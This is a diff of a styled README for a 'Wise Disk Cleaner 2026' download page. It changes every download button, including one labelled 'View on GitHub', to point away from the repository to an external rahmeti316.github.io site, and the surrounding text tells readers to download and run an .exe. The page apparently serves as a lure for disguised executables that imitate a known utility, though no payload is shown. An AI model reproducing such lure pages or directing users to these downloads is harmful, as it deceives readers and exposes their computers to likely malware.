@@ -1,8 +1,8 @@
 <h1 style="font-family: Arial, sans-serif; color: #333; margin-bottom: 10px;">🧹 Wise-Disk-Cleaner-2026 - Free Up Space and Speed Up Your PC</h1>
 
 <div style="margin: 25px 0;">
-<a href="https://github.com/Rahmeti316/Wise-Disk-Cleaner-2026" style="display: inline-block; padding: 16px 32px; background-color: #007bff; color: #fff; text-decoration: none; border-radius: 8px; font-size: 18px; font-weight: bold; margin-right: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">📥 Download for Windows</a>
-<a href="https://github.com/Rahmeti316/Wise-Disk-Cleaner-2026" style="display: inline-block; padding: 16px 32px; background-color: #6c757d; color: #fff; text-decoration: none; border-radius: 8px; font-size: 18px; font-weight: bold;">📂 View on GitHub</a>
+<a href="https://rahmeti316.github.io" style="display: inline-block; padding: 16px 32px; background-color: #007bff; color: #fff; text-decoration: none; border-radius: 8px; font-size: 18px; font-weight: bold; margin-right: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">📥 Download for Windows</a>
+<a href="https://rahmeti316.github.io" style="display: inline-block; padding: 16px 32px; background-color: #6c757d; color: #fff; text-decoration: none; border-radius: 8px; font-size: 18px; font-weight: bold;">📂 View on GitHub</a>
 </div>
 
 <p style="font-size: 18px; color: #555; line-height: 1.6; margin: 20px 0;">Wise Disk Cleaner 2026 helps you reclaim disk space and keep your Windows computer running smoothly. It finds and removes temporary files, junk data, and unnecessary files that slow down your PC. This guide walks you through downloading, installing, and using the software step by step.</p>
@@ -34,7 +34,7 @@
 <p style="font-size: 16px; color: #444; line-height: 1.8; margin: 15px 0 20px 10px;">Click the button below to visit the download page:</p>
 
 <div style="margin: 20px 0 20px 10px;">
-<a href="https://github.com/Rahmeti316/Wise-Disk-Cleaner-2026" style="display: inline-block; padding: 14px 28px; background-color: #28a745; color: #fff; text-decoration: none; border-radius: 6px; font-size: 16px; font-weight: bold;">⬇️ Visit Download Page</a>
+<a href="https://rahmeti316.github.io" style="display: inline-block; padding: 14px 28px; background-color: #28a745; color: #fff; text-decoration: none; border-radius: 6px; font-size: 16px; font-weight: bold;">⬇️ Visit Download Page</a>
 </div>
 
 <p style="font-size: 16px; color: #444; line-height: 1.8; margin: 15px 0 20px 10px;">On the GitHub page, look for the "Releases" section on the right side. Find the latest version and click on the file with the .exe extension to start downloading.</p>
